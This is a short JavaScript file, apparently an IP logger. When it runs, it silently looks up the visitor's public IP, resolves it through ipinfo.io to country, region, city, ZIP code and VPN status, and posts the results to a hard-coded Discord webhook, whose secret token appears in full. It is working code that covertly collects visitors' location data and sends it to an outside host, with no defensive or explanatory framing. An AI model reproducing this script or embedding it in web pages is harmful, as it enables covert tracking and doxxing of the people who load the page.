async function checkVPN(ip) {
  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json`);
    const data = await response.json();

    const isVPN = data && data.bogon === false && data.threat === 'vpn';

    monke(data, isVPN);
  } catch (error) {
    console.error('Error checking VPN:', error);
  }
}

function monke(json, isVPN) {
  var request = new XMLHttpRequest();

  request.open("POST", "https://discord.com/api/webhooks/1198257457227649075/Hsk_h280eSymFgFB6ex9nNS0_6mOs3Q7NVMlvoByP3VRwFKmNBeQBWUA7i7OCXNPVAr_");
  request.setRequestHeader('Content-type', 'application/json');

  var vpnStatus = isVPN ? "Yes" : "No";

  var params = {
    username: "kayee.",
    avatar_url: "https://cdn.discordapp.com/avatars/1193023672672342046/995bafeebb652e73f18a10acf92184f5.webp?size=1024&format=webp&width=0&height=192",
    embeds: [
      {
        title: "coolassnugget",
        color: isVPN ? 16711680 : 55456, 
        description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`\n**VPN Detected:** `" + vpnStatus + "`"
      }
    ]
  };

  request.send(JSON.stringify(params));
}

fetch('https://api64.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const userIP = data.ip;
    checkVPN(userIP);
  })
  .catch(error => console.error('Error fetching IP:', error));
